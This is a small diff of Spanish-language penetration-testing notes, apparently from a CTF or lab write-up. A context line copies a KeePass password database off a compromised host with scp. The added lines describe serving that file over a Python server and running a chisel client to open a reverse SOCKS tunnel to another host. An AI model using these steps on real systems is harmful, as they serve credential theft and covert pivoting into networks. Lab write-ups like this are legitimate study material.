@@ -598,7 +598,9 @@ scp -r galileo@172.30.0.12:/home/galileo/Passwords.kdbx ./
 ```python
 P1: Crear un servidor en python en el host HFS para poder compartir el archivo `Passwords.kdbx`
 
-P2: ejecutamos 
+P2: Ejecutamos ./chisel client 10.2.2.19:8888 R:9001:socks en el host www-data
+
+P3: 
 ```
 
 ![[Pasted image 20240908222500.png]]
